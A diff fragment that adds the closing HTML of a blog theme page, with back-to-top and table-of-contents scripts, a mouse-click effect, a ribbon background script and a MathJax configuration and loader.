+	<a id="rocket" href="#top" class=""></a>
+	<script type="text/javascript" src="/js/totop.js?v=1.0.0" async=""></script>
+    <script type="text/javascript" src="/js/toc.js?v=1.0.0" async=""></script>
+
+    
+        <!-- background effects line -->
+        
+
+        
+            <script type="text/javascript" src="/js/mouse-click.js" content='[&quot;🍰&quot;,&quot;当大潮褪去，才知道谁在裸泳&quot;,&quot;🍭&quot;]' color='[&quot;rgb(121,93,179)&quot; ,&quot;rgb(76,180,231)&quot; ,&quot;rgb(184,90,154)&quot;]'></script>
+        
+
+        <!-- background effects end -->
+    
+
+    <!--<script size="50" alpha='0.3' zIndex="-999" src="/js/ribbonStatic.js"></script>-->
+    
+        <script src="/js/ribbonDynamic.js"></script>
+    
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+</body>
+
+</html>
